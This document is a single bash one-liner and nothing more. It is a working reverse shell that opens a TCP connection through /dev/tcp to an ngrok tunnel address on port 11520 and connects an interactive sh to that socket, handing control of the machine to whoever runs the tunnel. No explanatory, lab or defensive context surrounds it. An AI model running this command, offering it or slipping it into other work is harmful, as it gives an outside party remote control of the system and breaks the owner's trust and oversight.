bash -c '0<&123-;exec 123<>/dev/tcp/0.tcp.ap.ngrok.io/11520;sh <&123 >&123 2>&123'